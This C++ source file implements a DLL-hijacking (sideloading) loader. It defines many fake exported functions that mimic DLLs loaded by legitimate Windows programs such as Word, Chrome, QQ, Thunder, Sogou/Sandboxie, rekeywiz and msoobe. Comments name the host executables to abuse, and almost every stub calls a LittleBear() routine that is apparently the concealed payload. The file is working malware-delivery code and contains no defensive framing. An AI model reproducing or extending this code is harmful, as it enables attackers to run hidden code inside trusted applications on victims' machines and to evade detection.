#include "main.h"
#include "Config.h"
#include <windows.h>
#include <iostream>
#include "public.h"
#include "dbghelp.h"
#include "ExportFunc.h"
#include "api.h"

#pragma comment(lib,"dbghelp.lib")

using namespace std;


#ifdef _WINDLL
#define DLLHIJACK_QQBROWSER
#define DLLHIJACK_LIBCURL
#define DLLHIJACK_VERSION
#define DLLHIJACK_SBIEDLL
#define DLLHIJACK_GETCURRENTROLLBACK
#define DLLHIJACK_GOOGLESERVICE
#define DLLHIJACK_QQMGRDIARY
#define DLLHIJACK_CLOVER
#define DLLHIJACK_MSOOBE
#define DLLHIJACK_REKEYWIZ
#define DLLHIJACK_91ASSISTUPDATE
#define DLLHIJACK_FIRSTLOAD
#elif defined HOOK_ORG_DLL
#else
#endif

//360se.exe  /n  "mytest.docx"  /o "%u"
//chrome_elf.dll
extern "C" __declspec(dllexport) void  SignalInitializeCrashReporting() {
	//MessageBoxA(0, "SignalInitializeCrashReporting", "SignalInitializeCrashReporting", MB_OK);
	LittleBear();
	return ;
}

//winword.exe
//wwlib.dll
extern "C" __declspec(dllexport) int FMain() {
	LittleBear();
	//MessageBoxA(0, "FMain", "FMain", MB_OK);
	return 0;
}

extern "C" __declspec(dllexport) int wdCommandDispatch()
{
	MessageBoxA(0, "wdCommandDispatch", "wdCommandDispatch", MB_OK);
	//LittleBear();
	return 0;
}

extern "C" __declspec(dllexport) int wdGetApplicationObject()
{
	MessageBoxA(0, "wdGetApplicationObject", "wdGetApplicationObject", MB_OK);
	//LittleBear();
	return 0;
}


//dsktptst.dll
extern "C" __declspec(dllexport) void* __stdcall SetCommandLine(void* Src) {
	LittleBear();
	return 0;
}

extern "C" __declspec(dllexport) int __stdcall ShowMessage(int a1) {
	LittleBear();

	//该函数有64个参数难以重写，必须退出才能保证不发生异常
	//ExitProcess(0);
	return 0;
}


#ifdef DLLHIJACK_QQBROWSER

extern "C" __declspec(dllexport) int __cdecl GMBSImpl(int a1)
{
	return LittleBear();
	//MessageBoxA(0, "GMBSImpl", "GMBSImpl", MB_OK);
	//return 0;
}

extern "C" __declspec(dllexport) int __cdecl GetMiniBrowserServer(int a1)
{
	return LittleBear();
	//MessageBoxA(0, "GetMiniBrowserServer", "GetMiniBrowserServer", MB_OK);
	//return 0;
}

extern "C" __declspec(dllexport) signed int Register()
{
	return LittleBear();
	//MessageBoxA(0, "Register", "Register", MB_OK);
	//return 0;
}

#endif


//firstload.dll
#ifdef DLLHIJACK_FIRSTLOAD
extern "C" __declspec(dllexport) int __stdcall Launch(char* a1) {
	//MessageBoxA(0, "Launch", "Launch", MB_OK);
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) int __stdcall LaunchW(wchar_t* a1) {
	//MessageBoxA(0, "LaunchW", "LaunchW", MB_OK);
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) int Launch2(char* a1) {
	//MessageBoxA(0, "Launch2", "Launch2", MB_OK);
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) int Launch2W(wchar_t* a1) {
	//MessageBoxA(0, "Launch2W", "Launch2W", MB_OK);
	LittleBear();
	return 0;
}
#endif

#ifdef THUNDER_EXPORT
// extern "C" __declspec(dllexport) int __stdcall TSEGetModule(int *a1){
// 	MainProc();
// 	return 0;
// }
// extern "C" __declspec(dllexport) int __stdcall TSEGetModuleEx(int *a1){
// 	MainProc();
// 	return 0;
// }

extern "C" __declspec(dllexport) int __stdcall ThunderModule_Init(int a1) {
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) void ThunderModule_Uninit() {
	LittleBear();
	return;
}
#endif

//libcurl.dll
#ifdef DLLHIJACK_LIBCURL
extern "C" __declspec(dllexport) void* __stdcall liburl_1(int a1) {
	//MessageBoxA(0, "liburl_1", "liburl_1", MB_OK);
	LittleBear();
	return 0;
}

extern "C" __declspec(dllexport) signed int __stdcall TSEGetModule(int* a1) {
	//MessageBoxA(0, "TSEGetModule", "TSEGetModule", MB_OK);
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) signed int __stdcall TSEGetModuleEx(int* a1) {
	//MessageBoxA(0, "TSEGetModuleEx", "TSEGetModuleEx", MB_OK);
	LittleBear();
	return 0;
}

extern "C" __declspec(dllexport) int __cdecl mini_unzip_dll(int a1, int a2) {
	//MessageBoxA(0, "mini_unzip_dll", "mini_unzip_dll", MB_OK);
	LittleBear();
	return 0;
}

extern "C" __declspec(dllexport) int __cdecl curl_easy_cleanup(int a1)
{
	//MessageBoxA(0, "curl_easy_cleanup", "curl_easy_cleanup", 0);
	return 0;
}

//用VS2005反汇编 固定参数时是callee管理的
//extern "C" __declspec(dllexport) int __thiscall curl_easy_init(void *a1)
//extern "C" __declspec(dllexport) int __stdcall curl_easy_init(void *a1)
extern "C" __declspec(dllexport) int __cdecl curl_easy_init()
{
	LittleBear();
	//MessageBoxA(0, "curl_easy_init", "curl_easy_init", 0);
	return 0;
}

extern "C" __declspec(dllexport) int __cdecl curl_easy_perform(int a1)
{
	//MessageBoxA(0, "curl_easy_perform", "curl_easy_perform", 0);
	return 0;
}

extern "C" __declspec(dllexport) signed int __cdecl curl_easy_setopt(int a1, int a2, char a3)
{
	//MessageBoxA(0, "curl_easy_setopt", "curl_easy_setopt", 0);
	return 0;
}
#endif

//sogou.exe
//sbiedll.dll
#ifdef DLLHIJACK_SBIEDLL
extern "C" __declspec(dllexport) signed int SbieApi_Log()
{
	//MessageBoxA(0,"SbieApi_Log","SbieApi_Log",0);
	LittleBear();
	return TRUE;
}

extern "C" __declspec(dllexport) void __stdcall  SbieDll_Hook(int a1, int a2, int a3)
{
	//MessageBoxA(0,"SbieDll_Hook","SbieDll_Hook",0);
	LittleBear();
	return;
}
#endif


//getcurrentdeploy.dll
#ifdef DLLHIJACK_GETCURRENTROLLBACK
extern "C" __declspec(dllexport) void  GetCurrentInternal_ReportRollbackEvent()
{
	//MessageBoxA(0,"GetCurrentInternal_ReportRollbackEvent","GetCurrentInternal_ReportRollbackEvent",0);
	LittleBear();
	return;
}
int SetClientVerdict()
{
	MessageBoxA(0, "SetClientVerdict", "SetClientVerdict", 0);
	LittleBear();
	return  TRUE;
}
#endif

//clover.exe
//clover_dll.dll
#ifdef DLLHIJACK_CLOVER
extern "C" __declspec(dllexport) DWORD /*__stdcall*/ CloverMain(void)
{
	//MessageBoxA(0,"CloverMain","CloverMain",0);
	LittleBear();
	return  TRUE;
}
#endif

//qqupload.exe
//qmnetworkmgr.dll
#ifdef DLLHIJACK_QQMGRDIARY
extern "C" __declspec(dllexport) DWORD  __cdecl DestroyQMNetworkMgr(void)
{
	//MessageBoxA(0,"DestroyQMNetworkMgr","DestroyQMNetworkMgr",MB_OK);
	return 0;
}
extern "C" __declspec(dllexport) void __cdecl CreateQMNetworkMgr(DWORD a1)
{
	//MessageBoxA(0,"CreateQMNetworkMgr","CreateQMNetworkMgr",MB_OK);
	LittleBear();
	return;
}
#endif

//googleservice.dll
#ifdef DLLHIJACK_GOOGLESERVICE
extern "C" __declspec(dllexport) int  GoogleServices_1(int a1, int a2, int a3, int a4)
{
	LittleBear();
	//MessageBoxA(0,"GoogleServices_1","GoogleServices_1",0);
	return 0;
}
#endif

#ifdef DLLHIJACK_MSOOBE
//all is used in wdscore.dll
extern "C" __declspec(dllexport) VOID * CurrentIP()
{
	return 0;
	//MessageBoxA(0,"CurrentIP","CurrentIP",MB_OK);
}
extern "C" __declspec(dllexport) DWORD   ConstructPartialMsgVA(DWORD a1, char* a2)
{
	//return 0;
	//MessageBoxA(0,"ConstructPartialMsgVA","ConstructPartialMsgVA",MB_OK);
	return 0;
}
extern "C" __declspec(dllexport) char* ConstructPartialMsgVW(DWORD a1, DWORD a2)
{
	//return 0;
	//MessageBoxA(0,"ConstructPartialMsgVW","ConstructPartialMsgVW",MB_OK);
	return 0;
}
extern "C" __declspec(dllexport) DWORD WdsSetupLogDestroy()
{
	//MessageBoxA(0,"WdsSetupLogDestroy","WdsSetupLogDestroy",MB_OK);
	return 0;
}
extern "C" __declspec(dllexport) char* WdsSetupLogInit(DWORD a1, DWORD a2, wchar_t* a3)
{
	//MessageBoxA(0,"WdsSetupLogInit","WdsSetupLogInit",MB_OK);
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) DWORD WdsSetupLogMessageA()
{
	return 0;
	//MessageBoxA(0,"WdsSetupLogMessageA","WdsSetupLogMessageA",MB_OK);
}
extern "C" __declspec(dllexport) DWORD WdsSetupLogMessageW()
{
	return 0;
	//MessageBoxA(0,"WdsSetupLogMessageW","WdsSetupLogMessageW",MB_OK);
}
#endif



#ifdef DLLHIJACK_REKEYWIZ
//rekeywiz.exe //slc.dll
extern "C" __declspec(dllexport) DWORD __cdecl SLGetWindowsInformationDWORD(short* pwstr, DWORD a1)
{
	//MessageBoxA(0,"SLGetWindowsInformationDWORD","SLGetWindowsInformationDWORD",MB_OK);
	LittleBear();
	return TRUE;
}
#endif 



#ifdef DLLHIJACK_91ASSISTUPDATE
extern "C" __declspec(dllexport) void __cdecl initDll(void* a1, int a2, void* a3, void* a4, int a5)
{
	//MessageBoxA(0,"initDll","initDll",0);
	LittleBear();
}
extern "C" __declspec(dllexport) char __cdecl StartDownload(int a1)
{
	//MessageBoxA(0,"StartDownload","StartDownload",0);
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) char __cdecl GetLocalFileName(int a1, int a2)
{
	//MessageBoxA(0,"GetLocalFileName","GetLocalFileName",0);
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) int __cdecl CreateTask(LPCWSTR lpszUrl, int a2, int a3, int a4, int a5, int a6, int a7, int a8)
{
	//MessageBoxA(0,"CreateTask","CreateTask",0);
	LittleBear();
	return 0;
}
#endif


#ifdef DLLHIJACK_XBROWSER
int __stdcall XL_EnableReportAutoRestartApp(int a1, int a2)
{
	MessageBoxA(0, "XL_EnableReportAutoRestartApp", "XL_EnableReportAutoRestartApp", 0);
	return 0;
}
int __stdcall XL_InitBugHandler(int a1, int a2, int a3, int a4, int a5)
{
	MessageBoxA(0, "XL_InitBugHandler", "XL_InitBugHandler", 0);
	return 0;
}
int __stdcall XL_SetAlwaysSendReport(int a1)
{
	MessageBoxA(0, "XL_SetAlwaysSendReport", "XL_SetAlwaysSendReport", 0);
	return 0;
}
int __stdcall XL_SetBugReportRootDir(wchar_t* a1)
{
	LittleBear();
	MessageBoxA(0, "XL_SetBugReportRootDir", "XL_SetBugReportRootDir", 0);
	return 0;
}
int __stdcall XL_SetReportShowMode(int a1)
{
	MessageBoxA(0, "XL_SetReportShowMode", "XL_SetReportShowMode", 0);
	return 0;
}
#endif